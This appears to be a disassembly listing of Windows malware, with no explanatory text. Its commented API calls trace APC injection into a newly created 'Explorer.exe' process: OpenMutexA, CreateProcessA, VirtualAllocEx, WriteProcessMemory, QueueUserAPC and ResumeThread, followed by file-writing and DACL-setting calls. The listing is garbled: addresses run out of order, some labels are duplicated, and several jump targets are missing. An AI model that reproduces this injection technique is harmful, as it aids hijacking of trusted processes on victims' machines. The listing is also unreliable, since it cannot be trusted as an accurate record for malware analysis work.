loc_0A74:
loc_0A75: mov     ebp, esp
loc_24C7: mov     [esp+8+var_4], eax
loc_24CC: call    dword ptr ds:46022Ch ; Sleep
loc_0A02: mov     eax, [ecx+ebp]
loc_4A1D: mov     cl, [eax]
loc_1263: mov     [ebx+ebp], cl
loc_52BA: mov     edx, [eax+ebp]
loc_68C7: mov     al, [edx+edi]
loc_4460: mov     [edi+ebp], al
loc_1D38: mov     ecx, [eax+ebp]
loc_5414: add     ecx, eax
loc_419B: mov     [eax+ebp], ecx
loc_46D8: mov     edx, [ecx+ebp]
loc_352C: mov     [esp+0Ch+var_8], ebx
loc_5CA1: mov     [esp+10h+var_C], esi
loc_5CA6: call    dword ptr ds:478374h ; OpenMutexA
loc_4779: mov     [ecx+ebp], eax
loc_2B79: cmp     [ebp+var_4], ebx
loc_2B7D: jz      loc_44
loc_0039: mov     [esp+8+var_4], ebx
loc_003E: call    dword ptr ds:460230h ; ExitProcess
loc_006F: mov     [ebp+var_10], esi
loc_1778: movzx   ecx, byte ptr [ebp+var_C+3]
loc_177C: cmp     [ebp+var_10], ecx
loc_177F: jge     loc_2BC1
loc_2BEF: mov     edx, [ecx+ebp]
loc_2FF9: mov     eax, [esi+ebp]
loc_2FDB: lea     ebx, [ebx+edx*8]
loc_2FDE: mov     ecx, [eax+ebx]
loc_58C0: mov     [edx+ebp], ecx
loc_4073: mov     edx, [ebx+ebp]
loc_31EC: mov     eax, [ecx+ebp]
loc_3220: lea     edi, [edi+edx*8]
loc_3230: mov     ecx, [eax+edi]
loc_2C87: mov     [eax+ebp], ecx
loc_5797: mov     [esp-8+arg_4], ecx
loc_57C7: mov     [esp-4+arg_0], ebx
loc_57CC: lea     edx, [ebp-80h]
loc_1445: call    sub_E2F ; memset
loc_01AB: mov     [ebp-80h], edi
loc_0CED: mov     [ebp-34h], esi
loc_6B17: mov     [ebp-88h], ebx
loc_0AF2: mov     eax, [ebx+ebp]
loc_2E8F: sub     eax, esi
loc_25C8: mov     [ebx+ebp], eax
loc_6086: xor     ecx, ecx
loc_2716: cmp     [ebp-10h], ecx
loc_271A: setz    cl
loc_4239: lea     edx, [ebp-190h]
loc_4240: call    sub_21AB ; get decoded string (1='Explorer.exe')
loc_5B96: lea     eax, [ebp+var_28]
loc_08DC: lea     ecx, [ebp-80h]
loc_6879: mov     [esp-4+arg_0], ebx
loc_31D5: mov     [esp-0Ch+arg_8], esi
loc_5F8B: mov     [esp-8+arg_4], edi
loc_1E9F: mov     [esp+0Ch+var_8], edi
loc_307C: mov     [esp+4], esi
loc_2D12: mov     [esp-0Ch+arg_8], ecx
loc_2D17: lea     edx, [ebp-190h]
loc_25EE: mov     [esp+4], eax
loc_6A59: call    dword ptr ds:478378h ; CreateProcessA
loc_3C50: mov     [edi+ebp], eax
loc_45C0: cmp     [ebp-34h], edx
loc_12D7: jnz     loc_51CE
loc_51C1: cmp     [ebp-88h], ebx
loc_51C8: jg      loc_1F9D
loc_237F: mov     [esp+4], esi
loc_4FFF: mov     [esp+4], ecx
loc_3395: mov     eax, [edx+ebp]
loc_4B52: mov     [esp+10h+var_C], edx
loc_063E: mov     ecx, [edi+ebp]
loc_1A9D: call    dword ptr ds:47837Ch ; VirtualAllocEx
loc_1AC7: mov     [edi+ebp], eax
loc_5DBE: cmp     [ebp-30h], edi
loc_5DC2: jnz     loc_6A1E
loc_2BC3: mov     esp, ebp
loc_2BC6: retn
loc_6A1E:
loc_6A3C: mov     [ebp-2Ch], edi
loc_59AA: mov     edx, [ebx+ebp]
loc_44C2: mov     eax, [esi+ebp]
loc_4580: mov     ecx, [ebx+ebp]
loc_0D4D: add     ecx, [ebp+var_38]
loc_489F: mov     edx, [eax+ebp]
loc_6533: mov     eax, [edi+ebp]
loc_6538: call    dword ptr ds:478380h ; WriteProcessMemory
loc_37F4: mov     [edi+ebp], eax
loc_4E5E: cmp     [ebp+var_84], esi
loc_4E65: jnz     loc_3EFB
loc_3EFB:
loc_14FB: mov     [esp+8+var_4], edx
loc_0963: mov     ecx, [ebx+ebp]
loc_4BC1: mov     edx, [ebx+ebp]
loc_4BC6: call    dword ptr ds:478384h ; QueueUserAPC
loc_5012: mov     [ecx+ebp], eax
loc_5069: mov     eax, [ebx+ebp]
loc_3601: call    dword ptr ds:478388h ; ResumeThread
loc_3684: cmp     [ebp+var_10], esi
loc_3688: jnz     loc_4538
loc_47C5: mov     [esp+8+var_4], ebx
loc_47CA: lea     ecx, [ebp+var_2C8]
loc_40C4: mov     [esp+10h+var_C], eax
loc_0ECA: call    dword ptr ds:460398h ; GetModuleFileNameA
loc_0ED0: movzx   edx, byte ptr [ebp+var_C+3]
loc_05B4: mov     eax, [esi+ebp]
loc_05B8: lea     ecx, [eax+edx*8+16h]
loc_10A1: mov     [ebx+ebp], ecx
loc_66A4: mov     [ebp+var_198], ebx
loc_2809: mov     edx, [ebx+ebp]
loc_0976: or      edx, esi
loc_3639: mov     [ebx+ebp], edx
loc_3674: mov     [esp-4+arg_0], esi
loc_3679: lea     eax, [ebp-1BCh]
loc_2945: call    dword ptr ds:4783C4h ; InitializeSecurityDescriptor
loc_5E47: mov     [esp+0Ch+var_8], esi
loc_519F: mov     [esp-14h+arg_10], eax
loc_11C9: mov     [esp-0Ch+arg_8], eax
loc_4E92: lea     ecx, [ebp-1BCh]
loc_3792: call    dword ptr ds:4783C8h ; SetSecurityDescriptorDacl
loc_625E: mov     [ebp-1A8h], edi
loc_6265: lea     edx, [ebp-1BCh]
loc_6283: mov     [ebx+ebp], edx
loc_1759: mov     [ebp-1A0h], ecx
loc_1760: movzx   eax, byte ptr [ebp+var_C+2]
loc_6502: imul    eax, 3E8h
loc_6509: call    dword ptr ds:46022Ch ; Sleep
loc_56B5: mov     [ebp-88h], ebx
loc_665A: mov     ecx, [ebx+ebp]
loc_463B: sub     ecx, edi
loc_4F56: mov     [ebx+ebp], ecx
loc_4F5A: jnz     loc_611D
loc_21D0: mov     [esp+8+var_4], eax
loc_6117: call    dword ptr ds:460230h ; ExitProcess
loc_6136: mov     [esp+4], edi
loc_5A86: mov     [esp+4], esi
loc_4F14: mov     [esp+4], ecx
loc_0452: lea     edx, [ebp-1A8h]
loc_18C1: mov     [esp+1Ch+var_18], esi
loc_451F: mov     eax, [edx+ebp]
loc_4CAC: mov     ecx, [ebx+ebp]
loc_250C: call    dword ptr ds:4601F0h ; CreateFileA
loc_07B1: mov     [ebx+ebp], eax
loc_6917: cmp     [ebp-194h], ebx
loc_497E: jnz     sub_1D68
loc_18FF: mov     [esp+0Ch+var_8], ebx
loc_1C50: call    dword ptr ds:46022Ch ; Sleep
loc_1D68:
loc_5549: mov     [esp+8+var_4], edi
loc_0291: lea     edx, [ebp-2CCh]
loc_02C9: mov     [esp+0Ch+var_8], edi
loc_02CE: lea     eax, [ebp-2C8h]
loc_5560: mov     ecx, [edx+ebp]
loc_5565: call    dword ptr ds:4602F8h ; WriteFile
loc_5589: mov     edx, [esi+ebp]
loc_4532: call    dword ptr ds:460340h ; CloseHandle
loc_4538: movzx   eax, byte ptr [ebp+var_C+3]
loc_2D2B: sub     eax, esi
loc_2D2E: cmp     [ebp+var_10], eax
loc_01B6: jnz     loc_2BBC
loc_2BB1: mov     [esp+8+var_4], esi
loc_2BB6: call    dword ptr ds:460230h ; ExitProcess
loc_5AA3: mov     eax, [edi+ebp]
loc_5804: add     eax, edi
loc_0DFA: mov     [edx+ebp], eax
loc_2BBC:
loc_611D:
loc_4538:
loc_1F9D:
loc_51CE:
loc_2BC1:
loc_2BC1: xor     al, al
loc_0044: